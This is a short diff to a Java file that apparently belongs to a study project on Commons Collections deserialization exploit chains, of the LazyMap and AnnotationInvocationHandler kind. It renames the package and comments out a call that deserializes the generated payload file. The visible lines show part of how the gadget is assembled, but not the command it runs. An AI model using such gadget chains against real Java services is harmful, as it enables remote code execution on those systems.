@@ -1,4 +1,4 @@
-package ysoChainsEXP;
+package EXP.ysoChainsEXP;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -38,7 +38,7 @@ public class LazyFinalEXP {
         invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);
 
         serialize(invocationHandler);
-        unserialize("ser.bin");
+//        unserialize("ser.bin");
     }
         public static void serialize(Object obj) throws IOException {
             ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
